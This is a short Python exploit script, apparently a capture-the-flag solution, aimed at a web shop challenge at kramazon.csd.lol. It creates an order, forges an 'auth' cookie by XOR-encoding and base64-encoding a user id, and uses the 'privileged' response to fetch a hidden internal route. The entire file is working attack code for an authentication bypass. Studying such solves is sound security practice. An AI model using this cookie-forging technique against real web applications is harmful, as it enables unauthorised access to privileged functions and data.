import requests
from urllib.parse import quote
import base64

url = "https://kramazon.csd.lol"

# get order id
res = requests.post(f'{url}/create-order')
res = requests.get(f'{url}/{res.json()["callback_url"]}')
order = res.json()['internal']['order']

# finalise with priority
cookie = quote(base64.b64encode(bytes([b ^ 0x37 for b in b'1'])))

res = requests.post(f"{url}/finalize", json={ 'order': order }, cookies={ 'auth': cookie })

data = res.json()

if data['privileged']:
    route = data['internal_route']
    res = requests.get(f'{url}{route}')

    print(res.text)